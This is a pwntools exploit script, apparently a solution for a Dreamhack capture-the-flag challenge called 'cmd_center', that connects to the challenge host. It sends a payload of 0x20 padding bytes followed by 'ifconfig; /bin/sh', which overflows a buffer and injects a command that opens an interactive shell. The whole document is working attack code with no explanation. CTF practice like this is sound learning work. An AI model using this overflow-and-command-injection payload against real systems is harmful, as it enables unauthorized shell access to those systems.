from pwn import *

PORT =  17401
HOST = "host3.dreamhack.games"
exe = context.binary = ELF('./cmd_center', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*main+130
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

# GDB()

pl = flat(
	b"A"*0x20,
	b"ifconfig; /bin/sh",
	)

p.sendlineafter(b"name: ", pl)

p.interactive()